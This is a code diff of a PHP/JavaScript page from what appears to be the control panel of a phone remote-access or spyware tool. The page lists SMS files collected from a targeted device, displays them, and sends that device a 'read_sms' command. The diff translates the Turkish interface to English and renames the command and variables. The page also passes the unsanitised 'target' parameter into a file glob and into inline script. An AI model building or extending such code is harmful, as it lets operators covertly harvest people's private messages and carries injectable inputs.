@@ -2,13 +2,13 @@
 require_once 'module_controller.php';
 
 $uid_device = $_GET['target'];
-$contact_path = '../private/storage/sms-'.$uid_device.'*';
-$filelist = glob($contact_path);
-$contact_file_list = array();
+$sms_path = '../private/storage/sms-'.$uid_device.'*';
+$filelist = glob($sms_path);
+$sms_file_list = array();
 foreach ($filelist as $file){
     $c_data = explode("/", $file);
     $num = (count($c_data) - 1);
-    array_push($contact_file_list, $c_data[$num]);
+    array_push($sms_file_list, $c_data[$num]);
 }
 
 ?>
@@ -20,18 +20,18 @@ foreach ($filelist as $file){
                 <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
 
                 <div class="col-md-10 col-lg-offset-0">
-                        <label for="select" class="col-lg-2 control-label">Kayıtlı Dosyalar</label>
+                        <label for="select" class="col-lg-2 control-label">Existing Files</label>
                         <div class="col-lg-4">
                             <select class="form-control" id="selected-file" name="selected-file">
                                 <?php
-                                foreach ($contact_file_list as $file_name){
+                                foreach ($sms_file_list as $file_name){
                                     echo '<option>'.$file_name.'</option>';
                                 }
                                 ?>
                             </select>
                         </div>
 
-                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Dosyayı Göster</button>
+                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Show File</button>
 
                 </div>
 
@@ -72,7 +72,7 @@ foreach ($filelist as $file){
         $.post( "commands.php", { sms_file_name: selected_file}, function( data, err ) {
             if (data){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
@@ -92,7 +92,7 @@ foreach ($filelist as $file){
 
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
@@ -103,16 +103,16 @@ foreach ($filelist as $file){
     });
 
     $("#command-sender-id").click(function() {
-        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "sms_oku", value: true}, function( data, err ) {
+        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", command: "read_sms"}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
